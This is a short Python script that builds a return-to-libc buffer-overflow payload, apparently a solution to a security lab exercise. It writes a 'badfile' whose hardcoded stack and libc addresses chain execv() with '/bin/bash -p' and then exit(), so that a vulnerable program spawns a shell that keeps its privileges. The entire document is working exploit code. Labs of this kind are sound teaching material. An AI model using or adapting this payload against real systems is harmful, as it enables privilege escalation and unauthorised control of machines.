#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

base = 0xffffcd48 + 4 - 0xffffcd30 # the addr of "ret addr" of bof as well as "ebp" when call execv()

A = base + 24                 # NULL
content[A:A+4] = (0x0).to_bytes(4,byteorder='little')

B = base + 20
p_addr = 0xffffdf3c           # The address of "-p"
content[B:B+4] = (p_addr).to_bytes(4,byteorder='little')

C = base + 16
sh_addr = 0xffffd3c5          # The address of "/bin/bash"
content[C:C+4] = (sh_addr).to_bytes(4,byteorder='little')

W = base + 12
argv_addr = 0xffffcd60 + C    # The address of "argv" in main's input[]
content[W:W+4] = (argv_addr).to_bytes(4,byteorder='little')

X = base + 8
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Y = base
system_addr = 0xf7e994b0      # The address of execv()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = base + 4
exit_addr = 0xf7e04f80        # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
